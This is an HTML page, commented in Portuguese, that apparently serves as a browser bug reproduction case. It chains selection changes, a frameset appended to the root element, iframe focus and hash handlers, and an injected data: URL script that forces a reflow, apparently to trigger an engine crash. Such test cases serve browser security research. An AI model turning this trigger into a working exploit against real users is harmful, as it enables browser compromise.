<!DOCTYPE html>
<html>
<head>
  <style>
    iframe {
      content: url();
      zoom: 0.01;
    }
  </style>
</head>
<body>
  <iframe id="i0"></iframe>

  <script>
    window.onload = () => {
      // 1. Tenta manipular a seleção para simular o comportamento de Caret se necessário
      try {
        const sel = window.getSelection();
        sel.selectAllChildren(document.body);
      } catch (e) {}

      // 2. Anexa frameset no DocumentElement
      document.documentElement.append(document.createElement('frameset'));

      // 3. Evento de foco
      const i0 = document.getElementById('i0');
      i0.onfocus = () => {
        location.hash = 'y';
      };

      location.hash = 'x';

      // 4. Injeção de script via microtask assíncrona (Cache API)
      let s0 = document.createElement('script');
      s0.src = `data:text/javascript,caches.has('a').then(() => {
        let el = document.getElementById('i0');
        if (el) el.focus();
        // Força um reflow síncrono no DOM
        document.body.offsetHeight;
      });`;
      
      document.head.append(s0);
    };
  </script>
</body>
</html>
